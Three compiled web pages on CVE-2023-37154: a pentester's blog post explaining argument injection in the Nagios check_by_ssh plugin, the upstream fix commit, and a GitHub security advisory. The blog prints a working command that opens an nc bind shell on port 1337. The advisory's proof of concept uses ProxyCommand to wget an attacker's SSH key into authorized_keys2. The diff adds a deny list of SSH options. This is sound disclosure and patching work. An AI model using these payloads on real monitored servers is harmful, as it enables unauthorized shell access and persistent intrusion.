=== Content from joshua.hu_3b311dc6_20250111_110413.html ===

### [Joshua.Hu | Joshua Rogers' Scribbles](https://joshua.hu/) [About Me](https://joshua.hu/about.html) [Projects](https://joshua.hu/projects.html) [Ideas](https://joshua.hu/ideas.html) [Curriculum Vitae](https://joshua.hu/files/joshua-rogers-security-engineer.pdf) [Contact](https://joshua.hu/contact.html)

* Back To Top
* Hide ToC
  Show ToC

* [Nagios: A Quick History.](#nagios-a-quick-history)
* [Nagios Plugins](#nagios-plugins)
* [Nagios Connection Methods](#nagios-connection-methods)
* [Nagios Backdoor User](#nagios-backdoor-user)
* [Nagios Plugin Hacking](#nagios-plugin-hacking)
* [Discussion and Fix](#discussion-and-fix)
* [Conclusion](#conclusion)

# Nagios Plugins: Hacking Monitored Servers with check\_by\_ssh and Argument Injection: CVE-2023-37154

Nagios-compatible systems are some of the most widely used infrastructure monitoring solutions. They use “plugins” to monitor server performance, with “Nagios Core” interpreting results. However, there’s a potentially significant security issue with Nagios and its default plugins – they may be an effective backdoor to the monitored servers. Even with sysadmin restrictions on the user, it’s possible to bypass these restrictions and achieve remote code execution.

In this blog post, we’ll explore how Nagios can be used to execute arbitrary commands on servers with [nagios-plugins](https://github.com/nagios-plugins/nagios-plugins) or [monitoring-plugins/monitoring-plugins](https://github.com/monitoring-plugins/monitoring-plugins) installed, and how argument injection vulnerabilities can be abused to bypass restrictions on the nagios user’s SSH access.

---

### Nagios: A Quick History. [###](#nagios-a-quick-history)

“Nagios” was originally created in 1999, and is one of the world’s most popular infrastructure monitoring solutions. Effectively, Nagios has two parts: its core system, and its plugin system. The core system connects remotely to the server it is monitoring, runs a “plugin”, and then handles the response.

Nagios Core has under-gone various forks and clones in history, forming the basis for Naemon and Icinga, as well as op5, Shinken. Various projects have been created in peripheral to Nagios, such as Thruk and Nagios XI, which are web interfaces for the aforementioned core systems.

---

### Nagios Plugins [###](#nagios-plugins)

Nagios Plugins are small programs or scripts that perform the checks or tests on the host. These plugins can do practically anything: check connectivity to networks or services, check system statistics, perform tests on local or remote services, and so on. They are completely modular, so you can add plugins to monitor specific services for your environment easily: they simply must return an exit status code and some text that can be parsed by Nagios Core.

---

### Nagios Connection Methods [###](#nagios-connection-methods)

Again, it is important to note that the monitoring data is nearly always collected via a *pull* method – Nagios Core connects to the server being monitored, plugins are run, and data is collected. The connection is generally either using SSH, or NRPE (Nagios Remote Plugin Executor); the former using either SSH keys or credentials, and the latter of which *can* be authenticated using a pre-defined SSL certificate.

The Nagios official documentation states that [SSH is more secure than NRPE](https://assets.nagios.com/downloads/nagioscore/docs/nrpe/NRPE.pdf). But is that completely true?

---

### Nagios Backdoor User [###](#nagios-backdoor-user)

When you set up nagios-plugins on the *monitored* host, you normally create a new user for the plugins to run. Just like other human users on the server, this user has access to a shell accessible via SSH.

If Nagios uses SSH to execute the plugins on the server, then, effectively, a backdoor account has been created: if you hack the private key from the Nagios Core server, then you can gain system access to every server being monitored. Seems bad, right?

In reality, people don’t usually allow the Nagios user on their monitored servers unrestricted shell access. Instead, a wrapper script restricts the user to running only installed plugins. For example, a restriction on Nagios’ SSH key in *authorized\_keys*:

```
command="/var/nagios/wrapper.sh",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-rsa [..ssh pubkey..]

```

could limit the user to running only plugins installed in */usr/lib/nagios/plugins/*:

```
#!/bin/sh

case "$SSH_ORIGINAL_COMMAND" in
    check_[a-z]*)
        /usr/lib/nagios/plugins/$SSH_ORIGINAL_COMMAND
        ;;
    *)
        exit 1
        ;;
esac

```

This way, the only commands that can be executed via SSH must begin with the name of an installed plugin. At first glance, this is a practical solution to restricting this account to not act as a backdoor for anybody that is able to gain access to the Nagios server.

---

### Nagios Plugin Hacking [###](#nagios-plugin-hacking)

During a recent pentest, I was in this exact situation: I had hacked the Nagios Core server, and had the private key used to connect via SSH to thousands of servers being monitored via Nagios. However, I couldn’t get a shell. Not straight away, at least.

Looking through the list of default installed plugins by the Debian package, I came across the *check\_by\_ssh* plugin, which “uses SSH to execute commands on a remote host”. That is to say, Nagios Core connects to a monitored server, and that monitored server then connects to a further system.

*check\_by\_ssh* comes with a handy option to pass parameters to the ssh client when it is executed on the monitored server:

```
     -o, --ssh-option=OPTION
        Call ssh with '-o OPTION' (may be used multiple times) [optional]

```

Coincidently while I was performing this aforementioned pentest, I was also working on a website documenting different ways to achieve command execution using a vulnerability known as argument injection. On that website, I have a list of different ways that the ssh client can be abused to execute commands *locally*. Documented at [gtfoargs.github.io/gtfoargs/ssh](https://gtfoargs.github.io/gtfoargs/ssh/), I list the well-known *ProxyCommand*, *PermitLocalCommand*, and *LocalCommand* options available in SSH, which will execute commands on the *client side*.

Effectively, *check\_by\_ssh* will call *ssh(1)*, which will call *system(3)* with user-supplied data.

Putting this all together, I realized that I could abuse this functionality to execute commands on the monitored system, using this *check\_by\_ssh* plugin. Using the following commands, I could execute *uname*:

```
ssh -i nagios.key nagios@server 'check_by_ssh -H remote-server -l passwordlessuser -o PermitLocalCommand=yes -o LocalCommand="uname" -o StrictHostKeyChecking=no'

```

The monitored server would connect to remote-server using the passwordlessuser user successfully, and *uname* would run on the monitored server itself. Due to either a limitation or bug in *check\_by\_ssh*, spaces did not work for the `-o` parameter of *check\_by\_ssh*.

The solution to this problem was to use `\${IFS}` in place of every space needed. As such, I came up with:

```
ssh -i nagios.key nagios@server "check_by_ssh -H remote-server -l passwordlressuser -v -o PermitLocalCommand=yes -o StrictHostKeyChecking=no -o LocalCommand=nc\${IFS}-l\${IFS}-p1337\${IFS}-e/bin/sh"

```

and was able to spawn a shell on port 1337.

---

### Discussion and Fix [###](#discussion-and-fix)

Different providers of *nagios-plugins* view this issue differently. The original <http://nagios-plugins.org/> considers this an issue and has fixed it in [this commit](https://github.com/nagios-plugins/nagios-plugins/commit/e8810de21be80148562b7e0168b0a62aeedffde6). [monitoring-plugins](https://github.com/monitoring-plugins/monitoring-plugins), which provides *nagios-plugins* for Ubuntu and Debian, do not consider this an issue, and they conclude that while the execution of arbitrary commands by *check\_by\_ssh* is not well known, there may be legitimate reason to support the functionality afforded by *ssh(1)*. In the former case, CVE-2023-37154 was assigned to the issue.

There is of course another discussion of how much responsibility lays on the sysadmins monitoring these systems. Other than abusing this functionality in *check\_by\_ssh*, the *negate* plugin can also arbitrarily run commands by design:

```
# ./negate --help
[..]
Negates the status of a plugin (returns OK for CRITICAL and vice-versa).
Additional switches can be used to control which state becomes what.

# ./negate '/bin/uname -a'
Linux security 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 GNU/Linux

```

However, even if a sysadmin installs only the plugins they need, there is an unknown factor of whether the plugins may *possibly* execute arbitrary commands on the host themself.

The aforementioned NRPE (which is now deprecated) recommended using predefined lists of commands which the plugins on the servers would run. In order to parse user-defined arguments, one must specifically configure `dont_blame_nrpe=1`. That may be the most secure method for SSH too.

---

### Conclusion [###](#conclusion)

In the world of security, it is the weakest link that an attacker should focus their attention on. Whether it be physical or digital, a server or a service; if an attacker is able to compromise a link that is imperative to the overall chain, then the whole chain falls. Monitoring systems are often neglected in terms of security despite their wide-reaching access. If you can take the Nagios server, you can take over the whole farm.

Published on
September
5th,
2023
by
Joshua Rogers

#

[Joshua.Hu | Joshua Rogers' Scribbles | by Joshua Rogers](https://joshua.hu/)



=== Content from github.com_7d9b6ebf_20250111_110413.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnagios-plugins%2Fnagios-plugins%2Fcommit%2Fe8810de21be80148562b7e0168b0a62aeedffde6)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnagios-plugins%2Fnagios-plugins%2Fcommit%2Fe8810de21be80148562b7e0168b0a62aeedffde6)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=nagios-plugins%2Fnagios-plugins)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[nagios-plugins](/nagios-plugins)
/
**[nagios-plugins](/nagios-plugins/nagios-plugins)**
Public

* [Notifications](/login?return_to=%2Fnagios-plugins%2Fnagios-plugins) You must be signed in to change notification settings
* [Fork
  334](/login?return_to=%2Fnagios-plugins%2Fnagios-plugins)
* [Star
   362](/login?return_to=%2Fnagios-plugins%2Fnagios-plugins)

* [Code](/nagios-plugins/nagios-plugins)
* [Issues
  170](/nagios-plugins/nagios-plugins/issues)
* [Pull requests
  28](/nagios-plugins/nagios-plugins/pulls)
* [Actions](/nagios-plugins/nagios-plugins/actions)
* [Projects
  0](/nagios-plugins/nagios-plugins/projects)
* [Wiki](/nagios-plugins/nagios-plugins/wiki)
* [Security](/nagios-plugins/nagios-plugins/security)
* [Insights](/nagios-plugins/nagios-plugins/pulse)

Additional navigation options

* [Code](/nagios-plugins/nagios-plugins)
* [Issues](/nagios-plugins/nagios-plugins/issues)
* [Pull requests](/nagios-plugins/nagios-plugins/pulls)
* [Actions](/nagios-plugins/nagios-plugins/actions)
* [Projects](/nagios-plugins/nagios-plugins/projects)
* [Wiki](/nagios-plugins/nagios-plugins/wiki)
* [Security](/nagios-plugins/nagios-plugins/security)
* [Insights](/nagios-plugins/nagios-plugins/pulse)

## Commit

[Permalink](/nagios-plugins/nagios-plugins/commit/e8810de21be80148562b7e0168b0a62aeedffde6)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

check\_by\_ssh: Prevent users from using several SSH options which run …

[Browse files](/nagios-plugins/nagios-plugins/tree/e8810de21be80148562b7e0168b0a62aeedffde6)
Browse the repository at this point in the history

```
…local commands.
```

* Loading branch information

Sebastian Wolf
committed
May 31, 2023

1 parent
[f47c8dd](/nagios-plugins/nagios-plugins/commit/f47c8dd387c72c1181126217a9f51176e18433aa)

commit e8810de

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**23 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* NEWS
  [NEWS](#diff-7ee66c4f1536ac84dc5bbff1b8312e2eef24b974b3e48a5c5c2bcfdf2eb8f3ce)
* configure.ac
  [configure.ac](#diff-49473dca262eeab3b4a43002adb08b4db31020d190caaad1594b47f1d5daa810)
* plugins

  + plugins/check\_by\_ssh.c
    [check\_by\_ssh.c](#diff-60637a6204e203153581f1afb944f2e08c822bc4fe36cbef830b14763484b4ef)

## There are no files selected for viewing

3 changes: 2 additions & 1 deletion

3
[NEWS](#diff-7ee66c4f1536ac84dc5bbff1b8312e2eef24b974b3e48a5c5c2bcfdf2eb8f3ce "NEWS")

Show comments

[View file](/nagios-plugins/nagios-plugins/blob/e8810de21be80148562b7e0168b0a62aeedffde6/NEWS)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

|  |  | @@ -1,10 +1,11 @@ |
|  |  | This file documents the major additions and syntax changes between releases. |
|  |  |  |
|  |  | 2.4.5 2023-05-15 |
|  |  | 2.4.5 2023-05-31 |
|  |  | FIXES |
|  |  | check\_dns: Fix buffer overflow on Ubuntu 22.04 (#699) |
|  |  | check\_sensors: Use grep instead of deprecated egrep (#697) |
|  |  | check\_tcp: Add --sni as an alias to -N (#701) |
|  |  | check\_by\_ssh: Prevent users from using ProxyCommand/LocalCommand/PermitLocalCommand (./configure --with-unrestricted-ssh-options=yes to re-enable) |
|  |  | build: fix bug when using VPATH builds (#700) |
|  |  |  |
|  |  | 2.4.4 2023-04-14 |
| Expand Down | |  |

10 changes: 10 additions & 0 deletions

10
[configure.ac](#diff-49473dca262eeab3b4a43002adb08b4db31020d190caaad1594b47f1d5daa810 "configure.ac")

Show comments

[View file](/nagios-plugins/nagios-plugins/blob/e8810de21be80148562b7e0168b0a62aeedffde6/configure.ac)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -418,6 +418,16 @@ then |
|  |  | [path and arguments for invoking 'who']) |
|  |  | fi |
|  |  |  |
|  |  | AC\_ARG\_WITH(unrestricted\_ssh\_options, |
|  |  | [AS\_HELP\_STRING([--with-unrestricted-ssh-options], |
|  |  | [allow any SSH options to be used with check\_by\_ssh])], |
|  |  | [], |
|  |  | [unrestricted\_ssh\_options=no]) |
|  |  |  |
|  |  | if test "x$with\_unrestricted\_ssh\_options" = xyes ; then |
|  |  | AC\_DEFINE(HAVE\_UNRESTRICTED\_SSH\_OPTIONS,[1],[Allow SSH to use options that run local commands.]) |
|  |  | fi |
|  |  |  |
|  |  | AC\_ARG\_WITH([ipv6], |
|  |  | [AS\_HELP\_STRING([--with-ipv6], [support IPv6 @<:@default=check@:>@])], |
|  |  | [], [with\_ipv6=check]) |
| Expand Down | |  |

12 changes: 11 additions & 1 deletion

12
[plugins/check\_by\_ssh.c](#diff-60637a6204e203153581f1afb944f2e08c822bc4fe36cbef830b14763484b4ef "plugins/check_by_ssh.c")

Show comments

[View file](/nagios-plugins/nagios-plugins/blob/e8810de21be80148562b7e0168b0a62aeedffde6/plugins/check_by_ssh.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -27,7 +27,7 @@ |
|  |  | \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/ |
|  |  |  |
|  |  | const char \*progname = "check\_by\_ssh"; |
|  |  | const char \*copyright = "2000-2014"; |
|  |  | const char \*copyright = "2000-"; |
|  |  | const char \*email = "devel@nagios-plugins.org"; |
|  |  |  |
|  |  | #include "common.h" |
| Expand Down  Expand Up | | @@ -304,6 +304,16 @@ process\_arguments (int argc, char \*\*argv) |
|  |  | skip\_stderr = atoi (optarg); |
|  |  | break; |
|  |  | case 'o': /\* Extra options for the ssh command \*/ |
|  |  |  |
|  |  | /\* Don't allow the user to run commands local to the nagios server, unless they decide otherwise at compile time. \*/ |
|  |  | #ifndef HAVE\_UNRESTRICTED\_SSH\_OPTIONS |
|  |  | if ( strcasestr(optarg, "ProxyCommand") != NULL |
|  |  | || strcasestr(optarg, "PermitLocalCommand") != NULL |
|  |  | || strcasestr(optarg, "LocalCommand") != NULL) { |
|  |  | break; |
|  |  | } |
|  |  | #endif |
|  |  |  |
|  |  | comm\_append("-o"); |
|  |  | comm\_append(optarg); |
|  |  | break; |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `e8810de`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnagios-plugins%2Fnagios-plugins%2Fcommit%2Fe8810de21be80148562b7e0168b0a62aeedffde6) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_e5b82dfd_20250111_110412.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmonitoring-plugins%2Fmonitoring-plugins%2Fsecurity%2Fadvisories%2FGHSA-p3gv-vmpx-hhw4)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmonitoring-plugins%2Fmonitoring-plugins%2Fsecurity%2Fadvisories%2FGHSA-p3gv-vmpx-hhw4)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=monitoring-plugins%2Fmonitoring-plugins)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[monitoring-plugins](/monitoring-plugins)
/
**[monitoring-plugins](/monitoring-plugins/monitoring-plugins)**
Public

* [Notifications](/login?return_to=%2Fmonitoring-plugins%2Fmonitoring-plugins) You must be signed in to change notification settings
* [Fork
  283](/login?return_to=%2Fmonitoring-plugins%2Fmonitoring-plugins)
* [Star
   489](/login?return_to=%2Fmonitoring-plugins%2Fmonitoring-plugins)

* [Code](/monitoring-plugins/monitoring-plugins)
* [Issues
  134](/monitoring-plugins/monitoring-plugins/issues)
* [Pull requests
  29](/monitoring-plugins/monitoring-plugins/pulls)
* [Actions](/monitoring-plugins/monitoring-plugins/actions)
* [Projects
  1](/monitoring-plugins/monitoring-plugins/projects)
* [Wiki](/monitoring-plugins/monitoring-plugins/wiki)
* [Security](/monitoring-plugins/monitoring-plugins/security)
* [Insights](/monitoring-plugins/monitoring-plugins/pulse)

Additional navigation options

* [Code](/monitoring-plugins/monitoring-plugins)
* [Issues](/monitoring-plugins/monitoring-plugins/issues)
* [Pull requests](/monitoring-plugins/monitoring-plugins/pulls)
* [Actions](/monitoring-plugins/monitoring-plugins/actions)
* [Projects](/monitoring-plugins/monitoring-plugins/projects)
* [Wiki](/monitoring-plugins/monitoring-plugins/wiki)
* [Security](/monitoring-plugins/monitoring-plugins/security)
* [Insights](/monitoring-plugins/monitoring-plugins/pulse)

# Local command execution in check\_by\_ssh.c

Low

[sni](/sni)
published
GHSA-p3gv-vmpx-hhw4
Aug 29, 2023

## Package

monitoring-plugins

## Affected versions

> 1.0.0

## Patched versions

this is expected behaviour

## Description

### Summary

Months ago, I discovered it is possible to execute arbitrary commands on servers using nagios-plugins. Due to a argument injection vulnerability, it is possible to execute arbitrary commands on servers with the Nagios plugin check\_by\_ssh installed.

### Details

Nagios' nagios-plugins has been updated [nagios-plugins/nagios-plugins@e8810de](https://github.com/nagios-plugins/nagios-plugins/commit/e8810de21be80148562b7e0168b0a62aeedffde6) to prevent using the ProxyCommand/LocalCommand/PermitLocalCommand commands in SSH, which could be used to execute arbitrary commands.

It has been fixed, and a CVE is assigned as CVE-2023-37154

### PoC

`check_by_ssh --command=ls -s 1 -H my-server.net -l someuser -v -o PermitLocalCommand=yes -o StrictHostKeyChecking=no -o ProxyCommand=wget\${IFS}-O\${IFS}.ssh/authorized_keys2\${IFS}http://my-website.com/pubkey.txt"`

### Impact

Remote command execution due to argument injection.

### Severity

Low

### CVE ID

CVE-2023-37154

### Weaknesses

No CWEs

### Credits

* [![@MegaManSec](https://avatars.githubusercontent.com/u/2505339?s=40&v=4)](/MegaManSec)
  [MegaManSec](/MegaManSec)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


